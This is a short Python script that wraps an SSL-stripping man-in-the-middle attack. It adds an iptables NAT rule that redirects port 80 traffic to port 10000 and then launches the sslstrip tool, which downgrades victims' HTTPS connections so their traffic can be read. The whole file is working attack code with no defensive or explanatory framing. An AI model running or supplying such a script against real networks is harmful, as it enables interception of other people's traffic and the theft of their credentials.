import os

class SSLStrip:
	
	def strip(self):
		try:
			print("Performing SSL strip now...")
			os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
			os.system('sslstrip')
		except KeyboardInterrupt:
			print("Stopping SSL strip.")

if __name__ == '__main__':
    ssl = SSLStrip()
    ssl.strip()

